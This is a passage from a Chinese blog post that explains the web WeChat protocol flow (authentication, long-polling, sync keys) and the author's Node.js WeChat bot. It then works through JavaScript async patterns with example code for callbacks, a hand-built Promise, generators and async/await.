  <span class="string">"ChatRoomOwner"</span>: <span class="string">"@31908794c3035a00b386bc9ef0526ee8d95b3c426d53fb4f9466b67d7a0b5fef"</span>,
  <span class="string">"HeadImgUrl"</span>: <span class="string">"/cgi-bin/mmwebwx-bin/webwxgetheadimg?seq=0&amp;username=@@a6dd369b835a7f6a3fc8d4f0ace3b2de80c9c097f0439955043e6b716eb007fb&amp;skey=@crypt_3bb2969_2e9301eaab7a4b13a3a893a0bb5e8dfb"</span>,
  <span class="string">"ContactFlag"</span>: <span class="number">2</span>,
  <span class="string">"MemberCount"</span>: <span class="number">2</span>,
  <span class="string">"MemberList"</span>: [{
    <span class="string">"Uin"</span>: <span class="number">236008826</span>,
    <span class="string">"UserName"</span>: <span class="string">"@912d2268c7e87688e5c8f33003b488f3adcfd3b4d25fcb9a271550bfc18a7328"</span>,
    <span class="string">"NickName"</span>: <span class="string">"膜法师"</span>,
    <span class="string">"AttrStatus"</span>: <span class="number">4357</span>,
    <span class="string">"PYInitial"</span>: <span class="string">""</span>,
    <span class="string">"PYQuanPin"</span>: <span class="string">""</span>,
    <span class="string">"RemarkPYInitial"</span>: <span class="string">""</span>,
    <span class="string">"RemarkPYQuanPin"</span>: <span class="string">""</span>,
    <span class="string">"MemberStatus"</span>: <span class="number">0</span>,
    <span class="string">"DisplayName"</span>: <span class="string">""</span>,
    <span class="string">"KeyWord"</span>: <span class="string">""</span>
    }
    ,{
    <span class="string">"Uin"</span>: <span class="number">2684027137</span>,
    <span class="string">"UserName"</span>: <span class="string">"@31908794c3035a00b386bc9ef0526ee8d95b3c426d53fb4f9466b67d7a0b5fef"</span>,
    <span class="string">"NickName"</span>: <span class="string">"狂风落尽深红色绿树成荫子满枝"</span>,
    <span class="string">"AttrStatus"</span>: <span class="number">131169</span>,
    <span class="string">"PYInitial"</span>: <span class="string">""</span>,
    <span class="string">"PYQuanPin"</span>: <span class="string">""</span>,
    <span class="string">"RemarkPYInitial"</span>: <span class="string">""</span>,
    <span class="string">"RemarkPYQuanPin"</span>: <span class="string">""</span>,
    <span class="string">"MemberStatus"</span>: <span class="number">0</span>,
    <span class="string">"DisplayName"</span>: <span class="string">""</span>,
    <span class="string">"KeyWord"</span>: <span class="string">""</span>
    }
],
<span class="string">"HideInputBarFlag"</span>: <span class="number">0</span>,
<span class="string">"Signature"</span>: <span class="string">""</span>,
<span class="string">"VerifyFlag"</span>: <span class="number">0</span>,
<span class="string">"RemarkName"</span>: <span class="string">""</span>,
<span class="string">"Statues"</span>: <span class="number">1</span>,
<span class="string">"AttrStatus"</span>: <span class="number">0</span>,
<span class="string">"Province"</span>: <span class="string">""</span>,
<span class="string">"City"</span>: <span class="string">""</span>,
<span class="string">"SnsFlag"</span>: <span class="number">0</span>,
<span class="string">"KeyWord"</span>: <span class="string">""</span>
}
</code></pre><p>一旦ModContactList中有内容，则更新本地联系人缓存。</p>
<p>这里只就文本消息进行了举例。实际上web微信有多种格式消息的支持。参见附录。</p>
<h3 id="总结:一图胜千言">总结:一图胜千言</h3><p><img src="http://img.vim-cn.com/dd/e58f9f5ba7b24544e9b00d4ad9b2005e78c18c.svg" alt="web微信概览"></p>
<p>整个流程如图所示。</p>
<p>我们应该注意到几点：</p>
<ul>
<li>首先，有三个服务器：第一个用来认证，返回一个ticket，并且检查ticket和uuid是否对应。第二个服务器负责登录、保持会话、更新消息、执行功能。第三个服务器仅仅保持长连接，我猜因为服务器端一直保持着每个用户的长连接来轮询，这种耗费资源的事情也确实应该分离出单独的服务器。</li>
<li>其次，js代码都是单线程的，客户端通过保持synccheck长连接来接收服务器端的消息，并在更新状态后继续synccheck。</li>
<li>最后，注意Synckey所起的作用，通过synckey的更新服务器知道客户端已经收到了哪些消息。</li>
</ul>
<h2 id="实现：又一个机器人——wechat-user-bot">实现：又一个机器人——wechat-user-bot</h2><p>在nodejs中我们可以实现完整的web微信功能。我准备做个机器人，</p>
<p>一方面，作为将来某系统的一部分。<br>另一方面，greathoul曾经说过有些人有需求来管理微信群<br>最主要的，for fun。</p>
<h3 id="流程控制">流程控制</h3><p>目标：在NodeJS中模拟上述流程</p>
<h4 id="流程概要">流程概要</h4><p>正如上一章节所述。整个流程可以简化为。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">               /----用户操作</span><br><span class="line">               |</span><br><span class="line">登录认证--&gt;长连接--&gt;更新-\</span><br><span class="line">               |         |</span><br><span class="line">               \---------/</span><br></pre></td></tr></table></figure>
<p>只是对机器人来说，用户操作由机器人自动实现。</p>
<p>在功能上，我们的机器人目前只完成了信息记录和聊天的功能。</p>
<p>因为整个应用是对以上web微信模型的反应，是在无数http请求之上架构而成。<br>因此，了解javascript中的流程控制方式才能与异步程序谈笑风生，所以，先概览一下js中的流程控制。</p>
<h4 id="Javascript中的流程控制">Javascript中的流程控制</h4><p>Javascript社区有四种驯服事件驱动异步编程的实践:</p>
<ul>
<li>callback</li>
<li>Promise</li>
<li>Promise + Generator</li>
<li>Async</li>
</ul>
<h5 id="回调地狱(Callback_Hell)">回调地狱(Callback Hell)</h5><p>假设你要运行一个任务管理器<br>输入id后，需要依次 <em>执行</em> 针对id的task1, task2, task3, task4…<br>在js这种异步语言里会是这样…</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">taskRunner</span>(<span class="params">id</span>) </span>&#123;</span><br><span class="line">  task1(id, <span class="function"><span class="keyword">function</span>(<span class="params">id</span>)</span>&#123;</span><br><span class="line">    task2(id, <span class="function"><span class="keyword">function</span>(<span class="params">id</span>)</span>&#123;</span><br><span class="line">      task3(id, <span class="function"><span class="keyword">function</span>(<span class="params">id</span>)</span>&#123;</span><br><span class="line">        task4(id, <span class="function"><span class="keyword">function</span>(<span class="params">id</span>)</span>&#123;</span><br><span class="line">          ...<span class="comment">// callback hell</span></span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>what a hell. 更糟糕的是，如果其中某个任务出错了，我怎么知道哪里出错了？</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asyncOperation</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"MyError!"</span>);</span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123; </span><br><span class="line">  asyncOperation();</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"I cannot catch : "</span>, e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>try和catch 没有用？并不能捕获错误。那么…只能在异步回调里使用try。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asyncOperation</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Error"</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">"asyncOperation catch it: "</span>, e.message);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123; </span><br><span class="line">    asyncOperation();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"I got no error"</span>, e);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>好吧，调用者又不能捕获错误了。run调用者怎么能知道发生了什么可呢。接下来其他函数怎么知道发生了什么？</p>
<p>Nodejs社区采用一种error first的调用惯例。下一个回调可以收到err，判断，作出动作。但想象一下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">taskRunner</span>(<span class="params">id</span>) </span>&#123;</span><br><span class="line">  task1(id, <span class="function"><span class="keyword">function</span>(<span class="params">err, task1Output</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) handleError(err);</span><br><span class="line">    doSomething(task1Output);</span><br><span class="line">    task2(task1Output, <span class="function"><span class="keyword">function</span>(<span class="params">err, res</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (err) handleError(err);</span><br><span class="line">      task3(id, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (err) handleError(err);</span><br><span class="line">        task4(id, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>)</span>&#123;</span><br><span class="line">          <span class="keyword">if</span> (err) handleError(err);</span><br><span class="line">          ...<span class="comment">// callback hell</span></span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看起来不好看是一回事。</p>
<p>如果doSomething出错了，错误如何捕获？</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">taskRunner</span>(<span class="params">id</span>) </span>&#123;</span><br><span class="line">  task1(id, <span class="function"><span class="keyword">function</span>(<span class="params">err, task1Output</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) handleError(err);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      doSomething(task1Output);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">      handleError(e);</span><br><span class="line">    &#125;</span><br><span class="line">    task2(task1Output, <span class="function"><span class="keyword">function</span>(<span class="params">err, res</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (err) handleError(err);</span><br><span class="line">      task3(id, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (err) handleError(err);</span><br><span class="line">        task4(id, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">          <span class="keyword">if</span> (err) handleError(err);</span><br><span class="line">          ...<span class="comment">// callback hell</span></span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再如果对handleError想做出错处理，再如果我们在流程中嵌入了更多的同步和异步混用的代码，他们都要处理错误…What the fuck…</p>
<p>再也不想看这样的代码。我们的大脑并不能很好的切合这种模式。而且，如果在task3和task4之间我想加入一个task5…考虑下你的当你想git blame…<br>也许把函数分离出来会好很多, 但我感觉好不到哪里。</p>
<h5 id="超简Promise实现">超简Promise实现</h5><p>我们想写这样的代码…</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">task1().then(task2).then(task3)...</span><br></pre></td></tr></table></figure>
<p>我们想做这样的错误处理</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">task1().then(task2, handleError).then(task3, handleError)...</span><br><span class="line"><span class="comment">// or</span></span><br><span class="line">task1().then(task2).then(task3)....then(taskN).catch(handleError);</span><br></pre></td></tr></table></figure>
<p>他们创造了Promise，一个许诺，一个代表未来的值。</p>
<p>一个一秒后才到来的事物。</p>
<p>一个神奇的设计, Promise几个标准规定了挺多，哦，也不多。不过我觉得核心的就三点:</p>
<ol>
<li>thenable</li>
<li>状态与缓存</li>
<li>能串行(Promise链)</li>
</ol>
<p>我们可以试着实现一个，实际Promise规范并没有规定实现方法，应该有很多实现方法。我们的方法是：</p>
<ul>
<li>同一个Promise可以用then注册多个回调，推入dfs中最后依次触发。</li>
<li>then返回一个Promise实现串行，而这个Promise将接下来要then的回调注册到自己的dfs中，一旦触发则调用自己的resolve函数将返回值喂给下一个then注册的回调函数。</li>
<li>resolve的延迟通过process.nextTick或者setTimeout(fn, 0)实现。</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Promise</span>(<span class="params">f</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> cache;  <span class="comment">// 未来的 值</span></span><br><span class="line">  <span class="keyword">var</span> dfs = []; <span class="comment">// Promise链上Defferds链, deferds保存当前回调callback, 如果值到来了，传给桥Promise的resolve</span></span><br><span class="line">  <span class="comment">// 如果没解析，则添加到defferd链上，如果解析了，则调用df链上所有回调</span></span><br><span class="line">  <span class="keyword">var</span> status = <span class="string">"pending"</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">this</span>.then = <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve</span>) </span>&#123;</span><br><span class="line">      handle(&#123;</span><br><span class="line">        callback: callback,</span><br><span class="line">        resolve: resolve</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params">df</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (status == <span class="string">"pending"</span>) &#123;</span><br><span class="line">      dfs.push(df);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (status == <span class="string">"fulfiled"</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> ret = df.callback(cache);</span><br><span class="line">      df.resolve(ret);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">resolve</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">    cache = value;</span><br><span class="line">    status = <span class="string">"fulfiled"</span>;</span><br><span class="line">    process.nextTick(()=&gt; &#123;</span><br><span class="line">      dfs.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">df</span>) </span>&#123;</span><br><span class="line">        handle(df);</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  f(resolve);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    resolve(<span class="number">15</span>);</span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">p1.then(<span class="function"><span class="keyword">function</span>(<span class="params">value</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"task 1"</span>, value); </span><br><span class="line">  <span class="keyword">return</span> value + <span class="number">1</span>;</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">value</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"task 2"</span>, value);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>当然，还有个处理reject的部分，类似如此实现错误的“冒泡”。</p>
<p>对了，如果对new操作符有疑问, <code>new</code> 之后新的对象引用的闭包变量并不是函数中的变量，好奇怪。<code>new</code> <em>并不</em> 创建闭包。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">this</span>.then = <span class="function"><span class="keyword">function</span>(<span class="params">t</span>)</span>&#123;a = t&#125;;</span><br><span class="line">  <span class="keyword">this</span>.print=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">console</span>.log(a)&#125;&#125;</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">&gt; x = <span class="keyword">new</span> f()</span><br><span class="line">f &#123; then: [<span class="built_in">Function</span>], print: [<span class="built_in">Function</span>] &#125;</span><br><span class="line">&gt; y = <span class="keyword">new</span> f()</span><br><span class="line">f &#123; then: [<span class="built_in">Function</span>], print: [<span class="built_in">Function</span>] &#125;</span><br><span class="line">&gt; x.then(<span class="number">5</span>)</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">&gt; x.print()</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">&gt; y.print()</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="literal">undefined</span></span><br></pre></td></tr></table></figure>
<p>好了，我们已经能够通过Promise成功实现异步串行。然而，还是有哪里不对劲的样子。Promise只能传递单一的值，Promise的语法非常繁复，Promise无法取消，没法用优雅的方式查看Promise链的状态。<br>详细可以看看<a href="https://github.com/getify/You-Dont-Know-JS" target="_blank" rel="external">YDKJS</a>。但我们能以更优雅的方式实现异步程序的编写和维护，处理错误，知道异步程序只被执行了一次等等。</p>
<h5 id="超简Promise+Generator">超简Promise+Generator</h5><p>后来，generator出现了，本来这玩意儿只是设计来循环。然而，yield能双向通信暂停程序却在同一个函数作用域的神奇属性被用来结合Promise做起了流程控制。想象一下</p>
<p>iterator可以yield出Promise，Promise resolve后可以将异步操作的结果返回iterator。</p>
<p>假设我们啊，有个社工库，我们根据id能获取其中的用户名和密码。这是什么例子。。。<br>考虑以下逻辑…</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params">id</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> getUser(id).then(<span class="function"><span class="keyword">function</span>(<span class="params">username</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> getPass(username).then(<span class="function"><span class="keyword">function</span>(<span class="params">password</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> &#123;username: username, password: password&#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们倒是想这样, 让user和name获取并行</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> *<span class="title">getInfo</span>(<span class="params">id</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> user = getUser(id);</span><br><span class="line">  <span class="keyword">var</span> pass = getPass(user);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"trying: "</span>, <span class="keyword">yield</span> user, <span class="keyword">yield</span> pass);  <span class="comment">// 同时yield</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUser</span>(<span class="params">id</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"get username"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      resolve(<span class="string">"name-"</span> + id);</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPass</span>(<span class="params">username</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"get password"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      resolve(<span class="string">"@us3r-"</span>);</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们实现个async函数来帮助我们完成繁复的Promise+generator过程(似乎也是简化的co)。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">async</span>(<span class="params">g</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> it = g.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params">result</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (result.done)</span><br><span class="line">        <span class="keyword">return</span> result.value;</span><br><span class="line">      <span class="keyword">return</span> result.value.then(<span class="function"><span class="keyword">function</span>(<span class="params">res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> handle(it.next(res))</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> handle(it.next())</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> find = <span class="keyword">async</span>(getInfo);</span><br><span class="line">find(<span class="string">"reverland"</span>);</span><br></pre></td></tr></table></figure>
<p>就这么并行了。</p>
<p>还可以串行</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> *<span class="title">taskRunner</span>(<span class="params">id</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> task1Output = <span class="keyword">yield</span> getUser(id);</span><br><span class="line">  <span class="keyword">var</span> task2Output = <span class="keyword">yield</span> getPass(task1Output);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"trying: "</span>, task2Output);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="Async/Await">Async/Await</h5><p>ES7中吸收了C#中async和await关键字，这样能更加优雅的书写和维护异步程序。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">taskRunner</span>(<span class="params">id</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> user = <span class="keyword">await</span> getUser(id);</span><br><span class="line">  <span class="keyword">var</span> pass = <span class="keyword">await</span> getPass(user);</span><br><span class="line">  <span class="built_in">console</span>.log(user, pass);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然而你需要一个编译器将ES7的代码编译成当前可执行的代码。</p>
<h5 id="总结">总结</h5><p>从回调到async await经历了漫长的道路。</p>
<p>其中，EventEmitter（观察者模式）也被用来进行异步程序的流程控制，回调注入(比如async库，如果我没理解错的话)也被用来进行流程控制。都一定程度解决了一定的问题。能力有限，不讨论了，<br>《深入浅出NodeJS》里有精彩解说。</p>
<h4 id="WechatUserBot">WechatUserBot</h4><p><a href="https://github.com/HalfdogStudio/wechat-user-bot" target="_blank" rel="external">wechat-user-bot on github</a></p>
<p><img src="http://img.vim-cn.com/29/f41ad0c325dec0de4b62c7c0184a9b72619704.svg" alt="wechat-user-bot架构"></p>
<p>微信机器人，使用Promise技术将web微信模型映射到程序世界。实际上，流程清晰之后，模型明了之后，用什么方式实现都不那么重要。<br>我提到Promise，因为希望各位看官能理解wechat user bot是如何在其基础上实现了上述模型，希望来自其它语言的看客们也能够理解Promise冗余的语法下究竟是什么。但既然谈到Promise，就把整个流程控制一并提及。</p>
<p>NodeJS环境中提供的网络请求、文件系统等功能也为机器人的实现提供了基础。最最开始使用Node核心模块https模块来处理网络请求，手工管理cookie，后来使用request替换。</p>
<p>造轮子能加深你对系统的理解，而用现成的库当然好啊。</p>
<p>好了，以上是概述。</p>
<p>我就目前的设计来描述下这个微信机器人具体实现。代码组织可能会变，但本质上没什么大变。<br>变化是没有终点的，我觉得现在值得一记和参考。</p>
